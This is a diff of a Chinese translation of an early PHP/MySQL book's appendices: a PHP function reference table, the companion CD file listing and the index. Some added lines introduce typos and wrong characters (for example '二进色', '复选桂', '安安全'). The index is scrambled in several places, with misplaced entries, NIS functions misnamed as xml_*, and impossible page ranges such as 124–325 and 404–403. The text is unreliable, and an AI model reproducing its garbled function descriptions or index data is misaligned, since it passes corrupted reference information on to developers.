 | sybase_fetch_field | SYBASE | 获取字段信息 |
+
 | sybase_fetch_object | SYBASE | 以对象形式获取行 |
+
 | sybase_fetch_row | SYBASE | 以枚举数组获取行 |
+
 | sybase_field_seek | SYBASE | 设置字段偏移量 |
+
 | sybase_free_result | SYBASE | 释放结果内存 |
+
 | sybase_num_fields | SYBASE | 获取结果中的字段数 |
+
 | sybase_num_rows | SYBASE | 获取结果中的行数 |
 
 ## 表 D.1 按字母顺序排列的 PHP 函数（续）
 
 | 函数名称 | 分组名称 | 说明 |
+
 | :--- | :--- | :--- |
+
 | sybase_pconnect | SYBASE | 打开持久性 Sybase 连接 |
+
 | sybase_query | SYBASE | 发送 Sybase 查询 |
+
 | sybase_result | SYBASE | 获取结果数据 |
+
 | sybase_select_db | SYBASE | 选择 Sybase 数据库 |
+
 | symlink | FILESY | 创建符号链接 |
+
 | syslog | NETWORK | 生成系统日志消息 |
+
 | system | EXEC | 执行外部程序并显示输出 |
+
 | Tan | MATH | 正切 |
+
 | tempnam | FILESY | 创建唯一文件名 |
+
 | time | DATETIME | 返回当前 UNIX 时间戳 |
+
 | touch | FILESY | 设置文件的修改时间 |
+
 | trim | STRINGS | 去除字符串两端的空白 |
+
 | uasort | ARRAY | 使用用户定义的比较函数排序数组并保持索引关联 |
+
 | ucfirst | STRINGS | 将字符串的首字母转换为大写 |
+
 | ucwords | STRINGS | 将字符串中每个单词的首字母转换为大写 |
+
 | usort | ARRAY | 使用用户定义的比较函数通过键排序数组 |
+
 | umask | FILESY | 更改当前的 umask |
+
 | uniqid | MISC | 生成唯一 ID |
+
 | unlink | FILESY | 删除文件 |
-| unpack | MISC | 从二进制字符串中解包数据 |
+
+| unpack | MISC | 从二进色字符串中解包数据 |
+
 | unserialize | MISC | 从存储的表示创建 PHP 值 |
 
 ## 表 D.1 按字母顺序排列的 PHP 函数（续）
 
 | 函数名称 | 分组名称 | 说明 |
+
 | :--- | :--- | :--- |
+
 | unset | VAR | 取消给定变量 |
+
 | urldecode | URL | 解码 URL 编码字符串 |
+
 | urlencode | URL | URL 编码字符串 |
+
 | usleep | MISC | 微秒级延迟执行 |
+
 | usort | ARRAY | 使用用户定义的比较函数通过值排序数组 |
+
 | utf8_decode | XML | 将 UTF-8 编码的字符串转换为 ISO-8859-1 |
+
 | utf8_encode | XML | 将 ISO-8859-1 字符串转换为 UTF-8 |
+
 | virtual | APACHE | 执行 Apache 子请求 |
+
 | vm_addalias | VMAILMGR | 为虚拟用户添加别名 |
+
 | vm_adduser | VMAILMGR | 带密码添加新虚拟用户 |
+
 | vm_delalias | VMAILMGR | 删除别名 |
+
 | vm_deluser | VMAILMGR | 删除虚拟用户 |
+
 | vm_passwd | VMAILMGR | 更改虚拟用户密码 |
+
 | wddx_add_vars | WDDX | 使用指定的 ID 结束 WDDX 数据包 |
+
 | wddx_deserialize | WDDX | 反序列化 WDDX 包 |
+
 | wddx_packet_end | WDDX | 使用指定的 ID 结束 WDDX 包 |
+
 | wddx_packet_start | WDDX | 开始一个包含结构的新 WDDX 包 |
+
 | wddx_serialize_value | WDDX | 将单个值序列化到 WDDX 包 |
+
 | wddx_serialize_vars | WDDX | 将变量序列化到 WDDX 包 |
+
 | xml_error_string | XML | 获取 XML 解析器错误字符串 |
+
 | xml_get_current_byte_index | XML | 获取 XML 解析器的当前字节索引 |
+
 | xml_get_current_column_number | XML | 获取 XML 解析器的当前列号 |
 
 ## 附录 D
@@ -14985,33 +16549,57 @@ echo "</ul>";
 ### 表 D.1 按字母顺序排列的 PHP 函数（续）
 
 | 函数名称 | 分组名称 | 说明 |
+
 | :--- | :--- | :--- |
+
 | xml_get_current_line_number | XML | 获取 XML 解析器的当前行号 |
+
 | xml_get_error_code | XML | 获取 XML 错误代码 |
+
 | xml_parse | XML | 解析 XML 文档 |
+
 | xml_parser_create | XML | 创建 XML 解析器 |
+
 | xml_parser_free | XML | 释放 XML 解析器 |
+
 | xml_parser_get_option | XML | 获取 XML 解析器的选项 |
+
 | xml_parser_set_option | XML | 设置 XML 解析器的选项 |
+
 | xml_set_character_data_handler | XML | 设置字符数据 |
+
 | xml_set_default_handler | XML | 设置默认处理器 |
+
 | xml_set_element_handler | XML | 设置开始和结束元素 |
+
 | xml_set_external_entity | XML | 设置外部实体 |
+
 | xml_set_notation_decl_handler | XML | 设置符号声明 |
+
 | xml_set_processing_handler | XML | 设置处理指令 (PI) 处理器 |
+
 | xml_set_unparsed_entity_decl | XML | 设置未解析实体声明 |
+
 | xml_errno | NIS | 返回上次操作的错误代码 |
+
 | xml_err_string | NIS | 返回上次操作的错误字符串 |
+
 | xml_first | NIS | 返回命名映射中的第一个键值 |
+
 | xml_get_default_domain | NIS | 获取机器的默认域 |
+
 | xml_master | NIS | 返回映射的主机名 |
 
 ## 表 D.1 按字母顺序排列的 PHP 函数（续）
 
 | 函数名称 | 分组名称 | 说明 |
+
 | :--- | :--- | :--- |
+
 | xml_match | NIS | 返回匹配的行 |
+
 | xml_next | NIS | 返回命名映射中的下一个键值 |
+
 | xml_order | NIS | 返回映射的顺序 |
 
 ## 光盘中有什么？
@@ -15019,143 +16607,262 @@ echo "</ul>";
 随书的光盘包含了书中用到的所有源代码。此外，编译 PHP 所需的压缩文件包括：
 
 /index.htm
+
 install.htm
+
 links.htm
 
 /files
+
 apache-1.3.4.tar.gz
+
 expat.tar.gz
+
 gcc-2.8.1.tar.gz
+
 libiodbc-2.50.3
+
 myodbc-2.50.24-src
+
 mysql-3.22.16b-gamma.gz
+
 php-3.0.11.tar.gz
+
 phplib.tar.gz
 
 /code
+
 ch03
+
 assign_scalars.php
+
 back_quoted_strings.php
+
 change_scalars.php
+
 common.inc
+
 dump_array.php
+
 interpolation.php
+
 line_breaks.php
+
 modulus.php
+
 postincrement.php
+
 preincrement.php
+
 ch04
+
 area_of_circle.php
+
 array_dump.php
+
 break.php
+
 common.inc
+
 continue.php
+
 create_list1.php
+
 create_list2.php
+
 default_values.php
+
 fibonacci.inc
+
 flagag.php
+
 nested_breaks.php
+
 nested_continue.php
+
 nested_functions.php
+
 ch05
+
 common.inc
+
 connect01.php
 
 ## 附录 E
 
 connect02.php
+
 menu.php
+
 /ch07
+
 common.inc
+
 display_form.inc
+
 display_heading.inc
+
 english_month_names.php
+
 english_month_names_actions.php
+
 english_month_names_actions_v01.php
+
 english_month_names_dsp_1_rec.inc
+
 english_month_names_dsp_1_rec_hdr.inc
+
 english_month_names_dsp_1_rec_v01.inc
+
 english_month_names_insert_form.inc
+
 english_month_names_v01.php
+
 english_month_names_v02.php
+
 get_record_info.inc
+
 index.php
+
 menu.php
+
 /ch08
+
 robots.txt
+
 /ch10
+
 cls_ink_color.inc
+
 cls_inventory_item.inc
+
 cls_pen.inc
+
 index.php
+
 /ch11
+
 /01
+
 first.php
+
 /02
+
 cls_html1.inc
+
 cls_htmlbase.inc
+
 second.php
+
 /03
+
 cls_html1.inc
+
 cls_htmlbase.inc
+
 third.php
+
 /04
+
 cls_head.inc
+
 cls_html1.inc
+
 cls_htmlbase.inc
+
 fourth.php
+
 /05
+
 cls_body.inc
+
 cls_head.inc
+
 cls_html1.inc
+
 cls_htmlbase.inc
+
 fifth.php
+
 /06
+
 cls_body.inc
+
 cls_head.inc
-cls_html.inc
+
+cls_html1.inc
+
 cls_htmlbase.inc
-cls_title.inc
+
 sixth.php
+
 /07
+
 cls_body.inc
+
 cls_comment.inc
+
 cls_head.inc
+
 cls_html.inc
+
 cls_htmlbase.inc
+
 cls_title.inc
+
 seventh.php
+
 /08
+
 cls_body.inc
+
 cls_comment.inc
+
 cls_font.inc
+
 cls_head.inc
+
 cls_html.inc
+
 cls_htmlbase.inc
+
 cls_title.inc
+
 eigth.php
+
 /09
+
 cls_body.inc
+
 cls_comment.inc
+
 cls_font.inc
+
 cls_head.inc
+
 cls_html.inc
+
 cls_htmlbase.inc
+
 cls_title.inc
+
 common.inc
+
 get_html.php
+
 ninth.php
+
 /ch12
+
 common.inc
+
 cookie.php
+
 error.php
+
 server_log.php
+
 test.php
-
-
-
-
 
 ```
 logininform.inc
@@ -15184,42 +16891,79 @@ xml102.php3
 ## 符号
 
 - && 运算符, 63, 64
+
 - * 字符, 197
+
 - $arr_request 数组, 110
+
 - #PHP_SELF 变量, 152
+
 - $this 变量, 244
+
 - == 运算符, 64
+
 - #FIXED 关键字, 404
+
 - #IMPLIED 关键字, 404
+
 - #PCDATA 关键字, 397–399
+
 - #REQUIRED 关键字, 404
+
 - -> 运算符, 253–254
+
 - /configure 程序, 13
+
 - || 运算符, 64
+
 - + 字符, 197
+
 - ++–运算符, 59
+
 - ? 字符, 197
+
 - / 字符, 205
+
 - + 聚合函数, 137–138
+
 - alter 语句, 121
+
 - alter table 语句, 124–128
+
 - ANY 内容, 399
+
 - Apache, 确定版本, 15
+
 - 应用逻辑, 与数据分离, 184–185
+
 - 应用程序
+
 - CGI
+
     - 调试, 304–305
+
     - 运行, 290–292
+
     - gcc (C 编译器) 的编译, 15
+
 - iODBC, 21
+
 - MyODBC, 21
+
 - MySQL, 16–17
+
 - PHP, 21–25
+
 - 算术运算符, 55–57
+
 - 数组变量
+
     - 赋值值, 40, 41
+
     - 目的, 38, 40
+
     - 取值, 41–44
+
 - array_dump 函数, 99–101
 
 ## 数字
@@ -15229,146 +16973,277 @@ xml102.php3
 ## A
 
 - 抽象
+
     - 定义, 236
+
     - 示例, 240
+
     - 目的, 239
+
 - 获取 HTML 表单信息, 109–111
+
 - ACTION 修饰符, 308
+
 - 语句, 73
+
 - 添加列选项, 124–325
+
     - $arr_request, 110
+
     - 作为函数参数, 93
+
     - 嵌入表单中, 186–189
+
     - 哈希表 (多维数组), 44–55
+
     - AS 关键字, 133
+
 - ASCII 字符, 437–488
+
 - 赋值运算符, 66–67
+
 - 赋值语句, 73
+
 - 星号字符 (*), 197
+
 - 原子, 197
 
 ## ATTLISTS, 400
 
 - break 关键字, 83–85
+
 - 属性
+
     - 浏览器。见 Web 浏览器
+
     - 属性默认规范, 404
+
     - 按钮
+
         - 属性类型规范, 404–403
+
         - 单选框, 310
+
     - ENTITY-/ENTITIES-类型, 403
+
     - 重置, 309
+
     - ID 类型, 401–403
+
     - 提交, 309
+
     - 在 XML 文档中, 387–389
 
 ## C
 
 - NMTOKEN-/NMTOKENS-类型, 403
+
 - 在数据库中缓存 HTML, 281–284
+
 - xml-lang, 388
+
 - 回调函数, 183–186
+
 - 身份验证
+
 - 样式表 (CSSs), 显示
+
     - 基础, 322
+
     - XML, 结合 411
+
     - 定义, 315
+
 - 大小敏感性, 384
+
 - 摘要, 322
+
 - CGI (通用网关接口)
+
     - htaccess, 320–323
+
     - 属性中的 cookies, 300–304
+
     - HTTP header, 316–320
+
     - 应用程序调试, 304–305
+
     - HTTP 结合数据库身份验证, 326–327
+
     - 应用程序目录, 290
+
     - 实现方法, 316
+
     - 环境变量, 294–297
+
     - 时间考虑, 323
+
     - 用户交互, 317
+
     - 脚本错误消息, 294
+
     - 使用数据库, 326–327
+
     - HTML 和 HTTP 头部, 288
+
     - PHP 中存储的变量, 317
+
     - 运行应用程序, 290–292
+
     - Web 服务器访问权限, 321–323
+
     - 搜索网站, 292
+
     - 安全问题, 299–300
+
     - AuthName 指令, 321
+
     - AuthType 指令, 322
+
     - AuthUser (或 AuthDigest) 指令, 322
+
     - 应用程序 URL, 291
+
     - Java Java applets, 289
+
     - Javascript, 289
+
 ## B
 
 - 反引号字符串, 372
+
 - 更改选项, 125–127
+
 - 基础身份验证, 322
+
 - 字符类, 197–198
+
 - 修改, 60–62
+
 - 位运算符, 60–62
+
 - body 标签, 268–273
+
 - <BODY> 标签, 268–273, 307
+
 - 布尔逻辑, 实现, 62–66
+
 - 边界表示法, 197
-- 复选框, 310
+
+- 复选桂, 310
+
 - CHECKED 修饰符, 308
+
 - 括号表达式, 197–198
+
 - class.FastTemplate, 192
+
 - 避免重复信息, 238–239
+
 - 字符, 197
+
 - 类内部, 250–253
+
 - 定义, 236
+
 - 示例, 243–244
+
 - 层次结构, 241–242
+
 - 基础类形成, 259–263
+
 - 目标, 258–259
+
 - 接口, 239–240
+
 - 属性, 247–248
+
 - 作为对象, 250–253
+
 - from 句, 134
+
 - group by 句, 137–138
+
 - having 句, 138–139
+
 - order by 句, 136–137
+
 - where 句, 134–136
+
 - 克隆记录, 171–174
+
 - 数据库表中的列, 解释, 118
+
 - 删除, 127–128
+
 - make 清理, 11
+
 - rm.cache, 11
+
 - 注释, 275–278
+
 - XML 文档中的注释, 393
+
 - 通用网关接口。见 Common Gateway Interface
+
 - common.inc 文件
+
     - 添加连接代码, 147
+
     - $request 数组由, 114
+
     - HTML 缓存使用, 281–282
+
     - gcc (C 编译器) 的编译, 15
+
 - iODBC, 21
+
 - MyODBC, 21
+
 - MySQL, 16–17
+
 - PHP, 21–25
+
 - 准备, 13–15
-- 复杂表达式, 71
+
+- 复杂表表达式, 71
+
 - 并发数据库访问, 352–360
+
 - 条件表达式, 78
+
 - 条件运算符, 57–58
+
 - connect.php 文件, 107–109
+
 - 连接数据库获取 HTML 信息, 109–111
+
 - 创建代码, 147
+
 - 创建 php 用户名, 147–149
+
 - connect.php 文件执行, 107–109
+
 - 使用 HTML 信息, 111–113
+
 - 连接代码, 147
+
 - 构造函数, 243–244
+
 - Content Type HTTP header, 293
+
 - continue 关键字, 86–88
+
 - cookie-name=cookie-value 字段, 301
+
 - cookies, 300–304
+
 - 创建数据库连接选项, 150
+
 - create 语句, 121
+
 - CSS 样式表显示 XML, 411
+
 - 大括号字符 ({), 206
 
 ## D
@@ -15378,228 +17253,409 @@ xml102.php3
 ## data (续)
 
 - 指令
+
     - 与应用逻辑分离, 184–185
+
     - AuthName, 321
+
     - AuthType, 322
+
 - 数据类型
+
     - 需要, 322
+
     - 字段中的更改, 125–127
+
     - display_form_function, 172, 173
+
     - 数字的, 43
+
     - display_heading_function, 173–174
+
     - 字符串, 43
+
 - 显示记录的术语, 119
+
 - 每行五个, 162
+
 - 数据库表。见 tables database
+
 - 限制数量, 162
+
 - 数据库
+
     - 每行一个, 157–158
+
     -  HTML 缓存, 281–284
+
     - 每行十二, 158
+
     - 组件, 117–118
+
     - do 关键字, 83
+
     - 并发访问问题, 352–360
+
 - DocBook, 408
+
 - 连接到:
+
     - doctype 声明, 394
+
     - doctype 标签, 261
+
     - 创建代码, 147
+
     - php 用户名, 147–149
+
 - 文档对象模型 (DOM) 解析器
+
     - XML 文档中的文档类型, 393
+
     - 使用 HTML 信息使用, 111–113
+
 - 文档类型声明, 394
+
 - 文档类型定义 (DTD)
+
     - 多用户编辑, 366–377
+
     - 步骤, 360
+
 - 双引号字符串, 46
+
 - dump_array 函数, 41–43
+
 - 动态变量名, 49
 
 ## E
 
 - 定义类, 243–244
+
 - 字段定义, 141–142
+
 - delete 语句, 140
+
 - 编辑记录, 169–171
+
 - 删除记录, 167–168
+
 - 分隔符，模式, 205–206
+
 - 摘要身份验证, 322
+
 - else 关键字, 75–76
+
 - 邮件消息，字段, 119–120
+
 - 封装, 236, 242
+
 - 编码与解码, URL, 297–299
+
 - XML 文档中的实体, 389–391
+
 - ENTITY 指令, 405–406
+
 - ENTITY-/ENTITIES-类型, 403
+
 - 属性值, 400
+
 - 环境变量, 294–297, 301
+
 - ereg 函数, 200, 201–202
+
 - ereg_replace 函数, 200, 202–203
+
 - eregi 函数, 200, 241–202
+
 - 错误消息
+
     - 500 错误, 304
+
     - CGI 脚本, 294
+
     - HTML 页面, 305
+
     - 服务器日志, 304
+
 error_log 函数, 304
+
 - expires-date 字段, 301
+
 - 表达式
+
     - 括号, 197–198
+
     - 复杂, 71
+
     - 组件, 70
+
     - 条件, 78
+
     - 定义, 50
+
     - 初始化, 79
+
     - 操作, 79
+
     - 正则, 196
+
     - 简单, 70
+
     - 类型, 71
+
     - 带副作用的, 71
+
 - 扩展模式
+
     - 在内部添加注释, 210–211
+
     - 扩展名称描述, 209
+
     - 目的, 209
+
 - 零宽负断言, 21
+
 - 零宽正向断言, 211–212
+
 - 可扩展标记语言 (XML)。见 XML (可扩展标记语言), 400
+
 - 可扩展样式语言 (XSL), 411
+
 - 可扩展样式语言转换 (XSLT), 214
+
 - 外部实体, 403
 
 ## F
 
 - 斐波契数列, 97–99
+
 - 字段定义, 141–142
+
 - 字段列表, 131–132
+
 - 字段
+
     - 别名, 133
+
     - 自动递增, 141–143
+
     - 修改数据类型, 125–127
+
     - cookie-name=cookie-value 字段, 301
+
     - date_created, 118
+
     - date_modified, 118
+
     - domain=server-domain, 301
+
     - 下拉列表输入, 310
+
     - te_created, 149
+
     - expires=expiration-date, 301
+
     - 解释, 117
+
     - flg_deleted, 149
+
     - 用于存储邮件消息, 119–120
+
 - 外键, 346
+
 - 相同, 141
+
 - 递增和递减, 186–189
+
 - 记录中的递增, 130–131
+
 - 连接, 336–337
+
 - 键, 167
+
 - null/not空, 122–124
+
 - path=cookie-path, 301
+
 - 主键, 346
-- 安全, 301
+
+- 安安全, 301
+
 - str_name, 149
+
 -  NULL 值, 344–345
-
-
-
-
 
 ## 索引
 
 ### # files
+
 - preg_match_all, 214–216
+
 - preg_replace, 216–219
+
 - preg_split, 219–220
+
 - 用途; 88
+
 - rawlencode, 298
+
 - 递归, 97–101
+
 - 值的转换, 89–92
+
 - 拆分, 200–205
+
 - sql_regcache, 201
+
 - 变量, 183–186
+
 - 参见特定函数的名称
 
 ### + common.inc
+
 - 添加连接代码, 147
+
 - 将表单信息放入 $arr_request 数组, 114
+
 - 在 HTML 缓存中用, 281–282
 
 ### + connect.php3, 107–109
+
 - 分组、身份验证, 322–323
+
 - 命名, 152, 225–226
+
 - php3 文件，修订, 150
+
 - 标记变量, 84–85
 
 ### + flg_deleted field, 149
+
 - 字体标签, 279–280
+
 - for 关键字, 78–81
+
 - 外键字段, 346
+
 - 表单元素, 186–189
-- <FORM>..</FORM> 标签, 707
+
+- <FORM>..</FORM> 标筓, 707
+
 - from 子句, 134 (205)
 
 ### + functions
+
 - 聚合, 137–138
+
 - array_dump, 99–101
+
 - 回调, 183–186
+
 - 与子程序的比较, 90
+
 - 组件, 88
 
 ### + constructor, 243–244
+
 - display_form, 172
+
 - display_heading, 173–174
+
 - dsp_properties, 255
+
 - dump_array, 41–43, 45
+
 - echo, 173
 
 ### + ereg, 200–202
+
 - ereg_replace, 200–202–203
+
 - ereg2, 201–202
+
 - ereg_replace, 200–203
+
 - error_log, 304
 
 ### + get_class_name, 255
+
 - get_record_info, 172
+
 - mysql_die, 185
+
 - 命名限制, 89
+
 - 嵌套函数调用, 96–97
+
 - 传递参数, 92–94
+
 - POSIX 样式, 200–205
+
 - preg_match, 213–214
 
 ## # G
+
 - + gcc (C 编译器), 12, 14, 15
+
 - 类的泛化, 238
+
 - generate 方法，在 HTML 模块创建中, 264–265
+
 - GET 方法，用于接收表单信息, 312
+
 - get_class_name 函数, 255
+
 - get_record_info 函数, 172
+
 - global 关键字, 95
 
 ### + GNU General Public License, 4
+
 - 按类分组, 137–138
+
 - 文件分组、身份验证, 322–323
 
 ## # H
+
 - + <H1>..</H1> 标签, 307
+
 - 哈希表 (多维数组), 44–45
+
 - cave having 类, 138–139
+
 - head 标签, 265–268
-- head 标签, 306
+
+- head 标筓, 306
+
 - <HEAD>..</HEAD> 标签, 306
+
 - 标题级别标签, 307
+
 - 类的层次结构, 241–242
+
 - 哈希, 316, 320–323
 
 ### + HTML (超文本标记语言)
+
 - 显示时的浏览器视图, 382
+
 - 数据库中的缓存, 281–284
+
 - 定义, 288
+
 - 与 XML 的区别, 384–385
+
 - 解释, 306
+
 - 扩展, 382
+
 - 与 PHP, 4–5
+
 - 使用 PHP 的问题, 258
+
 - 指定标题级别, 307
+
 - 缺点, 381–383
 
 ```
@@ -15611,14 +17667,21 @@ error_log 函数, 304
 ```
 
 ### HTML 类
+
 - 构造函数, 262
+
 - 创建, 263–264
+
 - 基类的形成, 259–263
+
 - 目标, 258–259
 
 ### HTML 表单信息
+
 - 访问, 109–111
+
 - 接收, 311–312
+
 - 用于连接数据库, 111–113
 
 ### HTML 表单，目的和组件, 307–312
@@ -15628,564 +17691,1052 @@ error_log 函数, 304
 ```
 
 ### HTTP 身份验证
+
 - 与数据库身份验证结合, 312–327
+
 - HTTP 头和, 316
 
 ### HTTP 头
+
 - 身份验证, 316–320
+
 - 类型, 292–294
+
 - HTTP, 定义, 288
+
 - HTTP_COOKIE 变量, 301
 
 ### 超文本标记语言 (HTML)
+
 ### HTML 模块
+
 - 创建, 263–264
+
 - 基类的形成, 259–263
 
 ### HTML 页面
+
 - 动态，优点, 288
+
 - 搜索, 292
 
 ### HTML 标签
+
 - 注释, 275–278
+
 - 字体, 279–280
+
 - 功能, 380
+
 - 通用, 278–279
+
 - head 标签, 265–306
+
 - 标题级别标签, 307
+
 - 不足, 381–382
-- 段落标签 <p>, 307
+
 - 默认属性，默认属性, 279–280
+
 - 不平衡的, 384
+
 - 参见特定标签
+
 - <BODY>..</BODY> 307
+
 - <BR>..</BR> 307
+
 - <FORM>..</FORM> 307
+
 - <H1>..</H1> 307
+
 - <HEAD>..</HEAD> 306
+
 - <HTML>..</HTML> 307
+
 - ID-类型属性, 401–403
+
 - if 语句, 74–76
+
 - 索引, 141
 
 ### 信息
+
 - 在表中更改, 129–131
+
 - 创建描述符, 117
+
 - 与数据区别, 116–117
+
 - 应用, 238–239
+
 - 定义, 236, 246
+
 - 示例, 246–247
+
 - 初始化表达式, 78
+
 - insert 语句, 120, 129
+
 - 插入记录
+
 - 定义表单, 150–153
+
 - 处理插入操作, 153–154
+
 - 验证, 156
+
 - 类的接口, 239–240
+
 - Internet Explorer 5 浏览器，显示 XML, 410–412
+
+
+
 - 插值，变量。参见变量插值
+
 - ODBC, 编译, 21
+
 - LIKE 运算符, 230–232
+
 - 链接, 13
+
 - 列表, 146
+
 - 字面量值，定义, 32
+
 - 数字字面量, 32–33
+
 - 文本字面量, 34–37
+
 - 逻辑运算符, 58, 62–66
+
 - 循环语句, 78
+
 - 循环变量, 79–81
+
 - 终止迭代到下一个, 86–88
 
 Java applets, 289
+
 - Javascript, 289
+
 - 数据库表连接, 342–344
+
 - 跳跃语句, 83–88
 
-## # K
+## K
+
 - + 键字段, 167
+
 - 检索记录, 118
 
 ### 关键字
-- #FIXED, 404
-- #IMPLIED, 404
-- #PCDATA, 397–399
-- #REQUIRED, 404
-- AS, 133
-- break, 83–85
-- continue, 86–88
-- do, 83
-- ELEMENT, 396–400
-- else, 75–76
-- elseif, 75
-- ENTITY, 405–406
-- for, 78–81
-- global, 95
-- NOTATION, 406–407
-- 用途, 72
-- switch, 76–78
-- SYSTEM, 407
-- while, 81–82
 
-## # M
+- `#FIXED`, 404
+
+- `#IMPLIED`, 404
+
+- `#PCDATA`, 397–399
+
+- `#REQUIRED`, 404
+
+- `AS`, 133
+
+- `break`, 83–85
+
+- `continue`, 86–88
+
+- `do`, 83
+
+- `ELEMENT`, 396–400
+
+- `else`, 75–76
+
+- `elseif`, 75
+
+- `ENTITY`, 405–406
+
+- `for`, 78–81
+
+- `global`, 95
+
+- `NOTATION`, 406–407
+
+- 用途, 72
+
+- `switch`, 76–78
+
+- `SYSTEM`, 407
+
+- `while`, 81–82
+
+## M
+
 - + Make (编译实用程序), 12
-- make clean 命令, 11
-- make distclean 命令, 11
+
+- `make clean` 命令, 11
+
+- `make distclean` 命令, 11
+
 - XML 文档中的标记部分, 391–392
-- LENGTH 修饰符, 308
-- menu.php3 文件，修订, 150
+
+- `LENGTH` 修饰符, 308
+
+- `menu.php3` 文件，修订, 150
 
 ### 元数据
+
 - 解释, 196
+
 - Perl 样式, 208–209
+
 - 表, 198–200
-- METHOD 修饰符, 308
+
+- `METHOD` 修饰符, 308
 
 ### 方法
-- generate, 264–265
-- GET, 312
+
+- `generate`, 264–265
+
+- `GET`, 312
+
 - 在 HTML 模块创建中, 264–265
+
 - 在面向对象编程中, 236, 240–242
-- POST, 312
+
+- `POST`, 312
+
 - 混合模型, 399
+
 - 定义, 237
+
 - 示例, 240
+
 - 用途, 239
 
-## # L
+## L
+
 - + 语言，XML 和 385, 388
-- Id (链接器程序), 12
-- Idconfig 程序, 12
+
+- `Id` (链接器程序), 12
+
+- `Idconfig` 程序, 12
+
 - 数据库表左连接, 342–343
 
 ### + 修饰符
-- ACTION, 308
-- CHECKED, 308
-- MAXLENGTH, 308
-- METHOD, 308
-- NAME, 308
-- SIZE, 308
-- TYPE, 308
-- VALUE, 308
+
+- `ACTION`, 308
+
+- `CHECKED`, 308
+
+- `MAXLENGTH`, 308
+
+- `METHOD`, 308
+
+- `NAME`, 308
+
+- `SIZE`, 308
+
+- `TYPE`, 308
+
+- `VALUE`, 308
 
 ### 模块化编程, 88
+
 - Mozilla 浏览器，显示 XML, 411
+
 - 多用户编辑，应用, 366–377
+
 - 步骤, 360–366
+
 - 多维, 21
+
 - MySQL, 编译, 16–17
+
 - 模式匹配, 230–332
+
 - 连接 phpMyAdmin, 193
+
 - 测试, 17–20
-- mysql 工具程序, 121
-- mysql_function, 185
-- mysqldump, 183–186
+
+- `mysql` 工具程序, 121
+
+- `mysql_function`, 185
+
+- `mysqldump`, 183–186
+
 - 对象变量, 38
+
 - 面向对象编程 (OOP) 术语, 236
+
 - 对象。参见类
+
 - OOP。参见面向对象编程 (OOP)
 
 ### 操作数
+
 - 更改值, 58–60
+
 - 定义, 50
+
 - 表达式, 79
+
 - 运算符
-- && 运算符, 64
-- == 运算符, 64
-- != 运算符, 59
+
+- `&&` 运算符, 64
+
+- `==` 运算符, 64
+
+- `!=` 运算符, 59
+
 - 算术, 55–57
+
 - 位取反, 59
+
 - 位运算, 60–62
+
 - 条件, 57–58
+
 - 逻辑, 58, 62–66
+
 - 或, 64
+
 - 优先级, 50–54
+
 - 后自增, 59
+
 - 前自增, 59
+
 - 用途, 50
+
 - 三元, 54–55
+
 - 单元, 58–60
+
 - 参见特定运算符
+
 - 添加列, 124–125
+
 - 更改列, 125–127
+
 - 删除列, 127–128
+
 - 创建数据库连接, 150
-- NAME 修饰符, 308
+
+- `NAME` 修饰符, 308
+
 - 命名参数, 244–246
+
 - 自然左连接，用于数据库表, 343
+
 - 嵌套调用, 96–97
+
 - 无操作语句, 72
+
 - NULL-类型属性, 403
+
 - NULL 值, 344–345
+
 - 空/非 字段, 122–124
+
 - 定义常量, 50
+
 - 数字数据类型, 43
+
 - 数字字面量, 32–33
+
 - 或运算符, 64–66
-- order by 子句, 136–137
+
+- `order by` 子句, 136–137
+
 - 优先级, 50–54
+
 - 用途, 196
+
 - 从字符串中移除空白字符, 226–227
+
 - 反转字符串中的单词, 228
+
 - 拆分字符串, 229
+
 - 模式，组件, 196–200
 
 ### Perl 样式函数
-- + 段落标签 <p>, 307, 381–382
+
+- + 段落标签 `<p>`, 307, 381–382
+
 - 赋值默认值, 94–95
+
 - 命名的, 244–246
+
 - 传递给函数, 92–94
+
 - XML 解析器, 417–421
+
 - 解析器
+
 - 扩展模式符号
+
 - 在模式内部添加注释, 210–211
+
 - 扩展名称和描述, 209
+
 - 用途, 209
+
 - + 文档对象模型 (DOM), 386
+
 - XML, 385–386
+
 - 密码
+
 - 零宽否定断言, 212
+
 - 零宽先行, 211–212
+
 - + 为不可读条目创建, 309
+
 - 用户文件包含, 320–321
-- path=cookie-path 字段, 301
+
+- `path=cookie-path` 字段, 301
+
 - 模式分隔符, 205–206
 
 ## 模式匹配
+
 - + PHP 作为应用服务器, 2
+
 - 与其他语言比较, 21–25
+
 - 成本, 4
+
 - 执行, 5
+
 - 特性, 2–3
+
 - + 给字符串添加前缀或后缀, 227–228
+
 - 判断字符串是否只有两个单词, 221–222
+
 - 判断字符串是否包含合法字面量, 223–224
+
 - 判断字符串是否有重复字符, 220
+
 - 感应, 4
+
 - 流行, 5–6
+
 - + 判断字符串是否包含合法 PHP 变量, 223
+
 - 寻找字符串中的第一个或最后一个单词, 221
+
 - 在文件规范中匹配文件名, 225–226
+
 - 匹配字符串单词的最后一个字符, 224
+
 - 匹配字符串中第二个单词的开头, 224–225
 
 ### PHPLIB, 安装, 25–28
+
 ### phpMyAdmin
+
 - 创建, 178
+
 - 特性, 178
+
 - 安装, 179
+
 - 语言支持, 188–192
+
 - 连接 MySQL 的问题, 193
+
 - 保护, 180–181, 193
+
 - 用途, 178
+
 - 使用, 182
+
 - + 匹配两个前缀和一个根词, 226
+
 - MySQL 运算符, 230–232
+
 - 执行“自定义”变量插值, 228–229
-
-
-
-
 
 ## 索引
 
 - 可移植性应用标准委员会 (PASC), 200
+
 - UNIX 风格函数的可移植性操作系统接口, 200–205
+
 - POSIX 字符类, 198
+
 - POSIX 风格函数, 200–205
+
 - POST 方法，用于接收信息, 312
+
 - 后置递增运算符, 59
+
 - 前置递减运算符, 59
+
 - 前置递增运算符, 59
-- preg_match 函数, 213–214
-- preg_match_all 函数, 214–216
-- preg_replace 函数, 216–219
-- preg_split 函数, 219–220
+
+- `preg_match` 函数, 213–214
+
+- `preg_match_all` 函数, 214–216
+
+- `preg_replace` 函数, 216–219
+
+- `preg_split` 函数, 219–220
+
 - 主字段, 346
+
 - XML 文档中的处理指令 (PIs), 292, 394
+
 - 编程，模块化, 88
+
 - 编程，面向对象。参见面向对象编程 (OOP) 程序
+
     - 组件, 70
+
     - 分成可管理的部分，类
+
     - 访问, 247–248
+
     - 作为对象, 250–253
+
     - 定义, 236, 238
+
     - 目的, 238
+
 - 创建唯一的, 118
+
 - 为其定义插入表单, 150–153
+
 - 删除, 167–168
+
 - 显示
+
     - 每行五个, 162–167
+
     - 限制数量时, 162
+
     - 每行一个, 157–158
+
     - 每行十二个, 158
+
 - 编辑, 169–171
+
 - 解释, 117–118
+
 - 检索内容的过滤, 138–139
+
